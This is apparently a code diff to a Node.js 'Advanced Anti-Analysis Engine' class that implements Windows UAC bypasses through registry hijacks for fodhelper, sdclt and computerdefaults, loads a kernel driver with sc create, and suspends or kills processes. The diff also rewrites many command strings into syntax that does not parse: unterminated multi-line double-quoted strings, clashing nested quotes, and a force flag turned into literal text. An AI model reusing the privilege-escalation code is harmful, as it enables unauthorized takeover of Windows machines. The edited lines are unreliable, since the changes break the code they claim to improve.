@@ -6,15 +6,30 @@ const path = require('path');
 const crypto = require('crypto');
 const { spawn, exec } = require('child_process');
 const { promisify } = require('util');
+const { getMemoryManager } = require('../utils/memory-manager');
 const os = require('os');
 
 const execAsync = promisify(exec);
 
 class AdvancedAntiAnalysis extends EventEmitter {
+    // Performance monitoring
+    static performance = {
+        monitor: (fn) => {
+            const start = process.hrtime.bigint();
+            const result = fn();
+            const end = process.hrtime.bigint();
+            const duration = Number(end - start) / 1000000; // Convert to milliseconds
+            if (duration > 100) { // Log slow operations
+                console.warn(`[PERF] Slow operation: ${duration.toFixed(2)}ms`);
+            }
+            return result;
+        }
+    }
     constructor() {
         super();
         this.name = 'Advanced Anti-Analysis Engine';
         this.version = '2.0.0';
+        this.memoryManager = getMemoryManager();
         this.initialized = false;
         
         // UAC bypass techniques
@@ -136,7 +151,7 @@ class AdvancedAntiAnalysis extends EventEmitter {
             'monitoring_detection'
         ];
         
-        this.activeOperations = new Map();
+        this.activeOperations = this.memoryManager.createManagedCollection('activeOperations', 'Map', 100);
         this.privilegeLevel = 'user';
         this.isElevated = false;
         this.kernelAccess = false;
@@ -288,19 +303,19 @@ class AdvancedAntiAnalysis extends EventEmitter {
         const tempDir = os.tmpdir();
         const fodhelperPath = path.join(tempDir, 'fodhelper.reg');
         
-        const regContent = `Windows Registry Editor Version 5.00
+        const regContent = "Windows Registry Editor Version 5.00
 
 [HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command]
 @="${payload || 'cmd.exe /c start cmd.exe'}"
 "DelegateExecute"=""
 
 [HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command\\DefaultIcon]
-@="${payload || 'cmd.exe'}"`;
+@=`${payload || 'cmd.exe'}`";
 
         await fs.writeFile(fodhelperPath, regContent);
         
         // Import registry file
-        await execAsync(`reg import "${fodhelperPath}"`);
+        await execAsync("reg import `${fodhelperPath}`");
         
         // Trigger UAC bypass
         await execAsync('fodhelper.exe');
@@ -316,14 +331,14 @@ class AdvancedAntiAnalysis extends EventEmitter {
         const tempDir = os.tmpdir();
         const sdcltPath = path.join(tempDir, 'sdclt.reg');
         
-        const regContent = `Windows Registry Editor Version 5.00
+        const regContent = "Windows Registry Editor Version 5.00
 
 [HKEY_CURRENT_USER\\Software\\Classes\\exefile\\shell\\runas\\command]
 @="${payload || 'cmd.exe /c start cmd.exe'}"
-"IsolatedCommand"="${payload || 'cmd.exe /c start cmd.exe'}"`;
+"IsolatedCommand"=`${payload || 'cmd.exe /c start cmd.exe'}`";
 
         await fs.writeFile(sdcltPath, regContent);
-        await execAsync(`reg import "${sdcltPath}"`);
+        await execAsync("reg import `${sdcltPath}`");
         await execAsync('sdclt.exe /KickOffElev');
         await fs.unlink(sdcltPath).catch(() => {});
         
@@ -335,14 +350,14 @@ class AdvancedAntiAnalysis extends EventEmitter {
         const tempDir = os.tmpdir();
         const computerdefaultsPath = path.join(tempDir, 'computerdefaults.reg');
         
-        const regContent = `Windows Registry Editor Version 5.00
+        const regContent = "Windows Registry Editor Version 5.00
 
 [HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command]
-@="${payload || 'cmd.exe /c start cmd.exe'}"
-"DelegateExecute"=""`;
+@=`${payload || 'cmd.exe /c start cmd.exe'}`
+"DelegateExecute"=""";
 
         await fs.writeFile(computerdefaultsPath, regContent);
-        await execAsync(`reg import "${computerdefaultsPath}"`);
+        await execAsync("reg import `${computerdefaultsPath}`");
         await execAsync('computerdefaults.exe');
         await fs.unlink(computerdefaultsPath).catch(() => {});
         
@@ -447,14 +462,14 @@ class AdvancedAntiAnalysis extends EventEmitter {
         const tempDir = os.tmpdir();
         const regPath = path.join(tempDir, `${method}.reg`);
         
-        const regContent = `Windows Registry Editor Version 5.00
+        const regContent = "Windows Registry Editor Version 5.00
 
 [HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command]
-@="${payload || 'cmd.exe /c start cmd.exe'}"
-"DelegateExecute"=""`;
+@=`${payload || 'cmd.exe /c start cmd.exe'}`
+"DelegateExecute"=""";
 
         await fs.writeFile(regPath, regContent);
-        await execAsync(`reg import "${regPath}"`);
+        await execAsync("reg import `${regPath}`");
         await execAsync(`${method}.exe`);
         await fs.unlink(regPath).catch(() => {});
         
@@ -519,7 +534,7 @@ class AdvancedAntiAnalysis extends EventEmitter {
             await fs.copyFile(driverPath, systemDriverPath);
             
             // Load driver using sc command
-            await execAsync(`sc create ${path.basename(driverPath, '.sys')} type= kernel binPath= "${systemDriverPath}"`);
+            await execAsync("sc create ${path.basename(driverPath, '.sys')} type= kernel binPath= `${systemDriverPath}`");
             await execAsync(`sc start ${path.basename(driverPath, '.sys')}`);
             
             return {
@@ -593,7 +608,7 @@ class AdvancedAntiAnalysis extends EventEmitter {
         try {
             // Use taskkill with force flag
             const forceFlag = force ? '/F' : '';
-            await execAsync(`taskkill /PID ${pid} ${forceFlag}`);
+            await execAsync(`taskkill /PID ${pid} forceFlag`);
             
             return {
                 success: true,
@@ -611,8 +626,8 @@ class AdvancedAntiAnalysis extends EventEmitter {
     async ntSuspendProcess(pid) {
         try {
             // Use PowerShell to suspend process
-            const psCommand = `Get-Process -Id ${pid} | Suspend-Process`;
-            await execAsync(`powershell -Command "${psCommand}"`);
+            const psCommand = "Get-Process -Id " + pid + " | Suspend-Process";
+            await execAsync("powershell -Command `${psCommand}`");
             
             return {
                 success: true,
@@ -629,8 +644,8 @@ class AdvancedAntiAnalysis extends EventEmitter {
     async ntResumeProcess(pid) {
         try {
             // Use PowerShell to resume process
-            const psCommand = `Get-Process -Id ${pid} | Resume-Process`;
-            await execAsync(`powershell -Command "${psCommand}"`);
+            const psCommand = "Get-Process -Id " + pid + " | Resume-Process";
+            await execAsync("powershell -Command `${psCommand}`");
             
             return {
                 success: true,
@@ -647,8 +662,8 @@ class AdvancedAntiAnalysis extends EventEmitter {
     async ntQueryInformationProcess(pid) {
         try {
             // Use PowerShell to query process information
-            const psCommand = `Get-Process -Id ${pid} | Select-Object Id, ProcessName, CPU, WorkingSet, VirtualMemorySize, HandleCount, Threads`;
-            const { stdout } = await execAsync(`powershell -Command "${psCommand}"`);
+            const psCommand = "Get-Process -Id " + pid + " | Select-Object Id, ProcessName, CPU, WorkingSet, VirtualMemorySize, HandleCount, Threads";
+            const { stdout } = await execAsync("powershell -Command `${psCommand}`");
             
             return {
                 success: true,
@@ -665,8 +680,8 @@ class AdvancedAntiAnalysis extends EventEmitter {
     async ntSetInformationProcess(pid) {
         try {
             // Use PowerShell to set process information
-            const psCommand = `Get-Process -Id ${pid} | Set-Process -Priority High`;
-            await execAsync(`powershell -Command "${psCommand}"`);
+            const psCommand = "Get-Process -Id " + pid + " | Set-Process -Priority High";
+            await execAsync("powershell -Command `${psCommand}`");
             
             return {
                 success: true,
@@ -684,7 +699,7 @@ class AdvancedAntiAnalysis extends EventEmitter {
         try {
             // Use PowerShell to open process
             const psCommand = `Get-Process -Id ${pid}`;
-            const { stdout } = await execAsync(`powershell -Command "${psCommand}"`);
+            const { stdout } = await execAsync("powershell -Command `${psCommand}`");
             
             return {
                 success: true,
@@ -702,8 +717,8 @@ class AdvancedAntiAnalysis extends EventEmitter {
     async ntClose(pid) {
         try {
             // Use PowerShell to close process handles
-            const psCommand = `Get-Process -Id ${pid} | Stop-Process`;
-            await execAsync(`powershell -Command "${psCommand}"`);
+            const psCommand = "Get-Process -Id " + pid + " | Stop-Process";
+            await execAsync("powershell -Command `${psCommand}`");
             
             return {
                 success: true,
@@ -720,8 +735,8 @@ class AdvancedAntiAnalysis extends EventEmitter {
     async ntDuplicateObject(pid) {
         try {
             // Use PowerShell to duplicate process object
-            const psCommand = `Get-Process -Id ${pid} | ForEach-Object { $_.Duplicate() }`;
-            await execAsync(`powershell -Command "${psCommand}"`);
+            const psCommand = "Get-Process -Id " + pid + " | ForEach-Object { $_.Duplicate() }";
+            await execAsync("powershell -Command `${psCommand}`");
             
             return {
                 success: true,
@@ -738,8 +753,8 @@ class AdvancedAntiAnalysis extends EventEmitter {
     async ntCreateProcess(pid) {
         try {
             // Use PowerShell to create process
-            const psCommand = `Start-Process -FilePath "cmd.exe" -ArgumentList "/c echo Process created from PID ${pid}"`;
-            await execAsync(`powershell -Command "${psCommand}"`);
+            const psCommand = "Start-Process -FilePath "cmd.exe" -ArgumentList `/c echo Process created from PID ${pid}`";
+            await execAsync("powershell -Command `${psCommand}`");
             
             return {
                 success: true,
@@ -756,8 +771,8 @@ class AdvancedAntiAnalysis extends EventEmitter {
     async ntCreateProcessEx(pid) {
         try {
             // Use PowerShell to create process with extended parameters
-            const psCommand = `Start-Process -FilePath "cmd.exe" -ArgumentList "/c echo Extended process created from PID ${pid}" -WindowStyle Hidden`;
-            await execAsync(`powershell -Command "${psCommand}"`);
+            const psCommand = "Start-Process -FilePath "cmd.exe" -ArgumentList `/c echo Extended process created from PID ${pid}` -WindowStyle Hidden";
+            await execAsync("powershell -Command `${psCommand}`");
             
             return {
                 success: true,
@@ -775,7 +790,7 @@ class AdvancedAntiAnalysis extends EventEmitter {
         try {
             // Use PowerShell to create user process
             const psCommand = `Start-Process -FilePath "notepad.exe" -PassThru`;
-            const { stdout } = await execAsync(`powershell -Command "${psCommand}"`);
+            const { stdout } = await execAsync("powershell -Command `${psCommand}`");
             
             return {
                 success: true,
@@ -794,7 +809,7 @@ class AdvancedAntiAnalysis extends EventEmitter {
         try {
             // Use PowerShell to create process as user
             const psCommand = `Start-Process -FilePath "calc.exe" -PassThru`;
-            const { stdout } = await execAsync(`powershell -Command "${psCommand}"`);
+            const { stdout } = await execAsync("powershell -Command `${psCommand}`");
             
             return {
                 success: true,
@@ -812,7 +827,7 @@ class AdvancedAntiAnalysis extends EventEmitter {
     async genericTerminateProcess(pid, force = false) {
         try {
             const forceFlag = force ? '/F' : '';
-            await execAsync(`taskkill /PID ${pid} ${forceFlag}`);
+            await execAsync(`taskkill /PID ${pid} forceFlag`);
             
             return {
                 success: true,
